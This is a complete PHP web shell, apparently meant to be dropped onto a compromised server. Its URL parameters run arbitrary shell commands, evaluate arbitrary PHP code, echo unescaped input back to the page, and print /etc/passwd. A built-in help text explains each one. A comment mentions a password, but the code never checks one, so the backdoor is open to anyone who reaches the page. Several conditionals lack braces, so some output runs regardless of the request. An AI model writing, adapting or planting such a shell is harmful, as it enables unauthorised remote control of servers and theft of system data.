<?php
//Change pass variable
$str = <<<EOD
page.php?shell=command executes the command as the user running php.
<br>page.php?php=command adds command to the php code to run
<br>page.php?echo=command writes the command string back to the page (mainly used for testing)
<br>page.php?disk
<br>page.php?phpversion
<br>page.php?info
<br>page.php?shadow (Show /etc/passwd)
EOD;

if(isset($_GET['shell'])) 
//echo("<pre>".shell_exec($_GET["shell"]." &")."</pre>");
echo("<textarea cols='30' rows='15' readonly='readonly'>".shell_exec($_GET["shell"]." 
&")."</textarea>");
//echo("<pre>".shell_exec($_GET["shell"]." &")."</pre>");

if(isset($_GET['php'])) 
echo(eval(stripcslashes($_GET["php"])));

if(isset($_GET['echo'])) 
echo($_GET["echo"]);

if(isset($_GET[help])) 
echo $str;

if(isset($_GET[disk]))
//$ds = disk_total_space(($_GET[disk]));
$ds = system("df --si | grep simfs");
echo $ds;

if(isset($_GET[phpversion]))
//$ds = disk_total_space(($_GET[disk]));
$pv = system("php -v");
echo $pv;

if(isset($_GET[info]))
$ip = getenv("REMOTE_ADDR"); 
//$sip = system("ip addr");
echo $ip;
//echo $sip;

if(isset($_GET[shadow]))
$shadowx = shell_exec("cat /etc/passwd");
echo "<pre>".$shadowx."</pre>";
?>
